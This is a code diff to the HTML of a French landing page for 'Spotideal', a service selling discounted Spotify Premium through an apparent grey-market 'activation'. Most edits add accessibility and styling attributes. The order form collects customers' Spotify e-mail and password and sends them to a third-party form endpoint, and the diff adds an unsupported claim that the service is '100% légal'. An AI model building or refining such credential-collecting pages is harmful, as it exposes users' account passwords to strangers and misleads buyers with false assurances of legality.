@@ -10,11 +10,11 @@
     <script src="src/js/script.js" defer></script>
 </head>
 <body>
-    <header>
-        <div class="logo">
-            <img src="src/images/logo.webp" alt="Spotideal Logo" />
+    <header class="sd-header">
+        <div class="logo" aria-label="Spotideal">
+            <img src="src/images/logo.webp" alt="Logo Spotideal" width="40" height="40" />
         </div>
-        <nav>
+        <nav aria-label="Navigation principale">
             <ul>
                 <li><a href="#features">Fonctionnalités</a></li>
                 <li><a href="#offer">Offre</a></li>
@@ -25,27 +25,27 @@
         </nav>
     </header>
     <main>
-        <section id="hero">
+        <section id="hero" class="sd-hero">
             <h1>L’Expérience Premium. Le Prix en Moins.</h1>
-            <p>Profitez de Spotify Premium à un prix réduit grâce à notre service d’activation.</p>
+            <p class="sd-hero-pitch">Profitez de Spotify Premium à un prix réduit grâce à notre service d’activation 100% légal.</p>
             <div class="cta-buttons">
                 <button type="button" onclick="scrollToSection('offer')">Découvrir l’Offre</button>
                 <button type="button" onclick="scrollToSection('how-it-works')">Comment ça marche ?</button>
             </div>
             <div class="testimonials">
-                <img src="src/images/avatar-1.webp" alt="Client satisfait 1">
-                <img src="src/images/avatar-2.webp" alt="Client satisfait 2">
-                <img src="src/images/avatar-3.webp" alt="Client satisfait 3">
-                <p>+ 500 clients satisfaits</p>
+                <img src="src/images/avatar-1.webp" alt="Client satisfait 1" width="48" height="48">
+                <img src="src/images/avatar-2.webp" alt="Client satisfait 2" width="48" height="48">
+                <img src="src/images/avatar-3.webp" alt="Client satisfait 3" width="48" height="48">
+                <span>+ 500 clients satisfaits</span>
             </div>
             <div class="hero-image">
-                <img src="src/images/hero-phone.webp" alt="Mock-up smartphone">
+                <img src="src/images/hero-phone.webp" alt="Aperçu mobile" width="220" height="440">
             </div>
         </section>
-        <!-- ...existing sections (Offre, Comparatif, etc.)... -->
+        <!-- ...existing code for other sections... -->
         <section id="order">
             <h2>Commander</h2>
-            <div class="important-box">
+            <div class="important-box" role="alert">
                 <h3>Important – Sécurité du Compte</h3>
                 <ul>
                     <li>Changez votre mot de passe Spotify avant de commencer.</li>
@@ -53,11 +53,11 @@
                     <li>Ne partagez jamais votre mot de passe habituel.</li>
                 </ul>
             </div>
-            <form id="orderForm" action="https://formspree.io/f/xanorewp" method="POST" autocomplete="off">
-                <label for="email">E-mail Spotify :</label>
-                <input type="email" id="email" name="email" required>
-                <label for="password">Mot de passe Spotify :</label>
-                <input type="password" id="password" name="password" required>
+            <form id="orderForm" action="https://formspree.io/f/xanorewp" method="POST" autocomplete="off" novalidate>
+                <label for="email">E-mail Spotify</label>
+                <input type="email" id="email" name="email" required autocomplete="username">
+                <label for="password">Mot de passe Spotify</label>
+                <input type="password" id="password" name="password" required autocomplete="new-password">
                 <div class="checkboxes">
                     <label><input type="checkbox" required> J’ai changé mon mot de passe avant de commencer.</label>
                     <label><input type="checkbox" required> Je comprends que vous me connecterez temporairement à mon compte.</label>
